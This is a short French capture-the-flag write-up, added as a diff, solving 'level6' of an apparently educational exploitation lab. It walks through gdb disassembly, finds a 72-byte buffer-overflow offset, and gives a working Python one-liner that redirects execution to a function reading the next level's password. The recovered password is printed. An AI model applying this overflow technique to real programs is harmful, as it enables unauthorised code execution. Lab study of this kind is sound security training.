@@ -1,0 +1,39 @@
+LEVEL 6
+-------
+
+1.	gdb level6
+
+2.	disas main
+	On ne remarque aucune fonction qui appelle un shell ou affiche le pass du level7.
+
+3.	info functions
+	0x08048454  n
+	0x08048468  m
+	0x0804847c  main
+	
+	disas n
+
+	0x08048461 <+13>:	call   0x8048370 <system@plt>
+	Avec en paramètre:
+	x/s 0x80485b0
+	0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+
+	disas m
+
+	Affiche "Nope" dans tous les cas sauf si on change cette fonction appelée
+	par une autre.
+
+4.	On lance le programme avec enormément de caractères.
+	run $(python -c 'print "A"*100')
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
+
+	Suite à ça on peut supposer qu'on peut changer cette adresse.
+	En faisant différents tests on sait que le payload est de 72.
+
+5.	A la fin du payload on ajoute l'adresse de n().
+	./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
+	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+6.	su level7
+	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
